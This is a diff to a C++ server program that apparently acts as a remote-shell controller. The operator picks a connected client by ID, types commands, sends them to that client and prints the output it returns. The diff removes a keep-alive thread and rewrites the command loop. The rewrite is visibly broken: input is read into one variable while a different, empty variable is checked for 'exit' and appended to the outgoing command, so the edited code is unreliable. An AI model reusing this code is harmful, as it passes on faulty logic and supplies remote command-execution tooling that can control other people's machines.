@@ -27,12 +27,6 @@ int32_t main(int32_t argc, char **argv) {
         exit(0);
     }).detach();
 
-    std::thread([&]() -> void {
-        sleep(60 * 4);
-
-        server.keepAliveCID();
-    });
-
     std::string sh;
 
     while (true) {
@@ -258,30 +252,35 @@ int32_t main(int32_t argc, char **argv) {
 
                 while (true) {
                     std::cout << "user-" << server.getCID().at(CID).data() << "> ";
-                    std::getline(std::cin, data);
 
-                    if (data == "exit")
-                        break;
+                    std::cin.clear();
 
-                    shell.push_back(SHELL_MODE_BYTE);
-                    shell += data;
+                    std::getline(std::cin, shell);
+                    
+                    if (shell.size()) {
+                        if (data == "exit")
+                            break;
 
-                    if (!server.sendBy(server.getCID().at(CID), shell))
-                        std::cout << "Send error" << std::endl;
+                        shell.push_back(SHELL_MODE_BYTE);
+                        shell += data;
 
-                    else
-                        std::cout << "Command sended" << std::endl;
+                        if (!server.sendBy(server.getCID().at(CID), shell))
+                            std::cout << "Send error" << std::endl;
 
-                    std::string shell_read;
+                        else
+                            std::cout << "Command sended" << std::endl;
 
-                    if(!server.readClientData(server.getCID().at(CID), &shell_read))
-                        std::cout << "Error read data from client" << std::endl;
+                        std::string shell_read;
 
-                    std::cout << shell_read.size() << std::endl;
-                    std::cout << shell_read << std::endl;
+                        if(!server.readClientData(server.getCID().at(CID), &shell_read))
+                            std::cout << "Error read data from client" << std::endl;
 
-                    shell.clear();
-                    data.clear();
+                        std::cout << shell_read.size() << std::endl;
+                        std::cout << shell_read << std::endl;
+
+                        shell.clear();
+                        data.clear();
+                    }
                 }
             }
         }
